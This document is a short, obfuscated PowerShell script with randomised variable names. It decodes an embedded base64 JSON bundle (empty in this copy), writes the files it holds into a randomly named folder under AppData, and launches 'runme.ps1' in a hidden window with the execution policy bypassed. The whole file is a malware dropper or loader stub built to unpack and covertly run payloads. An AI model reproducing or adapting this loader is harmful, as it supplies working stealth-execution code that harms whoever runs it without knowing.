$sv = 'Err'+'orAction'+'Preference'
Set-Variable -Name $sv -Value 'Stop'

$fjwoFJRP = ''

$eLlovaNy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fjwoFJRP))
$thpxLbkK = ConvertFrom-Json $eLlovaNy
$MVLelxyd = $thpxLbkK.paths
$QtlDbdZC = $thpxLbkK.data

$oDVcuUMH = Join-Path $Env:AppData 'Y4TFCR'
[System.IO.Directory]::CreateDirectory($oDVcuUMH) | Out-Null

for ($NELXeSWp = 0; $NELXeSWp -lt $MVLelxyd.Count; $NELXeSWp++) {
    $KSGSfoFF = $MVLelxyd[$NELXeSWp]
    $TwYgWcCa = [System.Convert]::FromBase64String($QtlDbdZC[$NELXeSWp])
    $xYPJMsCN = Join-Path $oDVcuUMH $KSGSfoFF
    $dWtYyLiM = [System.IO.Path]::GetDirectoryName($xYPJMsCN)
    if (-not (Test-Path $dWtYyLiM)) { New-Item -ItemType Directory -Path $dWtYyLiM | Out-Null }
    [System.IO.File]::WriteAllBytes($xYPJMsCN, $TwYgWcCa)
}

$HWHtTNBa = Join-Path $oDVcuUMH 'runme.ps1'
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$HWHtTNBa`"" -WindowStyle Hidden -WorkingDirectory $oDVcuUMH
